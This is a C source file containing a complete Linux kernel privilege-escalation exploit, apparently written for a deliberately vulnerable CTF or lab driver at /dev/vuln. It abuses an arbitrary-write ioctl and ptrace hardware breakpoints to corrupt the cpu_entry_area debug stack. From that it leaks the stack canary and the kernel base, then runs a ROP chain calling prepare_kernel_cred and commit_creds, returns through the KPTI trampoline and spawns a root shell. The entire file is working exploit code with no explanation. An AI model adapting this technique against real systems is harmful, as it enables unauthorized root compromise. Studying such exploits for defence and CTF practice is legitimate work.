// =-=-=-=-=-=-=-= INCLUDE =-=-=-=-=-=-=-=
#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

// =-=-=-=-=-=-=-= DEFINE =-=-=-=-=-=-=-=

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define GLOBAL_MMAP_ADDR ((char *)(0x12340000))
#define GLOBAL_MMAP_LENGTH (0x2000)

// ROP stuff
#define ROP_START_OFF (0x44)
#define CANARY_OFF (0x3d)
#define ROP_CNT (0x80)
#define o(x) (kbase + x)
#define pop_rdi o(0xb26a0)
#define pop_rdx o(0xa9eb57)
#define pop_rcx o(0x3468c3)
#define bss o(0x2595000)
#define dl_to_rdi o(0x20dd24)              // mov byte ptr [rdi], dl ; ret
#define push_rax_jmp_qword_rcx o(0x4d6870) // push rax ; jmp qword ptr [rcx]
#define commit_creds o(0xf8240)
#define prepare_kernel_cred o(0xf8520)
#define kpti_trampoline \
    o(0x10010e6) // in swapgs_restore_regs_and_return_to_usermode
#define somewhere_writable (bss)

// =-=-=-=-=-=-=-= GLOBAL VAR =-=-=-=-=-=-=-=

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

struct typ_cmd {
    uint64_t addr;
    uint64_t val;
};

int vuln_fd;
pid_t child;
pid_t trigger;

int sync_pipe[2][2];

// =-=-=-=-=-=-=-= FUNCTION =-=-=-=-=-=-=-=

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void init_tf_work(void) {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
        :
        : "memory");

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

#define DR_OFFSET(num) ((void *)(&((struct user *)0)->u_debugreg[num]))
void create_hbp(pid_t pid, void *addr) {

    // Set DR0: HBP address
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(0), addr) != 0) {
        die("create hbp ptrace dr0: %m");
    }

    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
     * on the instruction which causes the exception. bits 16,17 means we stop
     * on data read or write. */
    unsigned long dr_7 = (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17);
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(7), (void *)dr_7) != 0) {
        die("create hbp ptrace dr7: %m");
    }
}

void arb_write(int fd, uint64_t addr, uint64_t val) {
    struct typ_cmd cmd = {addr, val};
    ioctl(fd, 0, &cmd);
}

void do_init() {
    logd("do init ...");
    init_tf_work();

    vuln_fd = open("/dev/vuln", O_RDONLY);
    if (vuln_fd < 0) {
        die("open vuln_fd: %m");
    }

    // global mmap
    void *p = mmap(GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        die("mmap: %m");
    }

    if (pipe(sync_pipe[0])) {
        die("pipe: %m");
    }
    if (pipe(sync_pipe[1])) {
        die("pipe: %m");
    }
}

void fn_child() {
    logd("child MUST bind to cpu-0");
    bind_cpu(0);

    char *name_buf = (char *)GLOBAL_MMAP_ADDR;
    memset(GLOBAL_MMAP_ADDR, 0, GLOBAL_MMAP_LENGTH);

    // call ptrace
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0) {
        die("ptrace PTRACE_TRACEME: %m");
    }

    uint64_t skip_cnt =
        (sizeof(struct utsname) + sizeof(uint64_t) - 1) / sizeof(uint64_t);

    int step = 0;
    bool loop = true;
    while (loop) {
        // halt, and wait to be told to hit watchpoint
        raise(SIGSTOP);

        switch (step) {
        case 0: {
            // trigger hw_breakpoint and leak data from stack
#if (0)
            *(char *)name_buf = 1; // trigger `exc_debug_user()`
#else
            uname((void *)name_buf); // trigger `exc_debug_kernel()`
#endif
            // check if data leaked
            for (int i = skip_cnt; i < 100; i++) {
                if (((uint64_t *)name_buf)[i]) {
                    logi("child: FOUND kernel stack leak !!");
                    write(sync_pipe[1][1], GLOBAL_MMAP_ADDR,
                          GLOBAL_MMAP_LENGTH);
                    step++;
                    break;
                }
            }
        } break;
        case 1: {
            // build ROP
            logd("child: waiting to recv rop gadget ...");
            read(sync_pipe[0][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            logd("child: recv rop gadget");
            step++;
        } break;
        case 2: {
            // ROP attack
            prctl(PR_SET_MM, PR_SET_MM_MAP, GLOBAL_MMAP_ADDR,
                  sizeof(struct prctl_mm_map), 0);
        } break;
        default:
            break;
        }
    }

    return;
}

void fn_trigger() {
    logd("trigger: bind trigger to other cpu, e.g. cpu-1");
    bind_cpu(1);

    logd("trigger: modify rcx in cpu-0's `cpu_entry_area` DB_STACK infinitely");
    while (1) {
#define CPU_0_cpu_entry_area_DB_STACK_rcx_loc (0xfffffe0000010fb0)
#define OOB_SIZE(x) (x / 8)
        arb_write(vuln_fd, CPU_0_cpu_entry_area_DB_STACK_rcx_loc,
                  OOB_SIZE(0x400));
    }
}

int main(void) {
    do_init();

    logd("fork victim child ...");
    switch (child = fork()) {
    case -1:
        die("fork child: %m");
        break;
    case 0:
        // victim child
        fn_child();
        exit(0);
        break;
    default:
        // parent wait child
        waitpid(child, NULL, __WALL);
        break;
    }
    logd("child pid: %d", child);

    // kill child on exit
    if (ptrace(PTRACE_SETOPTIONS, child, NULL, (void *)PTRACE_O_EXITKILL) < 0) {
        die("ptrace set PTRACE_O_EXITKILL: %m");
    }

    logd("create hw_breakpoint for child");
    create_hbp(child, (void *)GLOBAL_MMAP_ADDR);

    logd("fork write-anywhere primitive trigger ...");
    switch (trigger = fork()) {
    case -1:
        die("fork trigger: %m");
        break;
    case 0:
        fn_trigger();
        exit(0);
        break;
    default:
        break;
    }

    logd("waiting for stack data leak ...");
    struct pollfd fds = {.fd = sync_pipe[1][0], .events = POLLIN};
    while (1) {
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);

        // use poll() to check if there is data to read
        int ret = poll(&fds, 1, 0);
        if (ret > 0 && (fds.revents & POLLIN)) {
            read(sync_pipe[1][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            break;
        }
    }

    // leak from come from victim child
    hexdump(GLOBAL_MMAP_ADDR + sizeof(struct utsname), 0x100);
    uint64_t *leak_buffer =
        (uint64_t *)(GLOBAL_MMAP_ADDR + sizeof(struct utsname));
    uint64_t canary = leak_buffer[0];
    logi("canary: 0x%lx", canary);
    uint64_t leak_kaddr = leak_buffer[4];
    logi("leak_kaddr: 0x%lx", leak_kaddr);
    uint64_t kbase = leak_kaddr - 0xe0b32;
    logi("kbase: 0x%lx", kbase);

    // start build rop gadget ...
    logd("build rop ...");
    uint64_t rop[ROP_START_OFF + ROP_CNT] = {0};
    rop[CANARY_OFF] = canary;
    uint64_t gadget_data = pop_rdi;
    uint64_t rop_buf[ROP_CNT] = {
        // prepare_kernel_cred(0)
        pop_rdi, 0, prepare_kernel_cred,

        // mov qword ptr[somewhere_writable], gadget_data
        pop_rdx, (gadget_data >> (8 * 0)) & 0xff, pop_rdi,
        somewhere_writable + 0, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 1)) & 0xff, pop_rdi, somewhere_writable + 1,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 2)) & 0xff, pop_rdi,
        somewhere_writable + 2, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 3)) & 0xff, pop_rdi, somewhere_writable + 3,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 4)) & 0xff, pop_rdi,
        somewhere_writable + 4, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 5)) & 0xff, pop_rdi, somewhere_writable + 5,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 6)) & 0xff, pop_rdi,
        somewhere_writable + 6, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 7)) & 0xff, pop_rdi, somewhere_writable + 7,
        dl_to_rdi,

        // mov rdi, rax
        pop_rcx, somewhere_writable, push_rax_jmp_qword_rcx,

        // commit_creds(cred)
        commit_creds,

        // return to userland
        kpti_trampoline,
        // frame
        0xdeadbeef, 0xbaadf00d, user_ip, user_cs, user_eflags,
        user_sp & 0xffffffffffffff00, user_ss};
    memcpy(rop + ROP_START_OFF, rop_buf, sizeof(rop_buf));

    logd("send rop gadget to victim child ...");
    write(sync_pipe[0][1], rop, sizeof(rop));

    logd("fire ...");
    while (1) {
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);
    }

    while (1) {
        sleep(100);
    }

    return 0;
}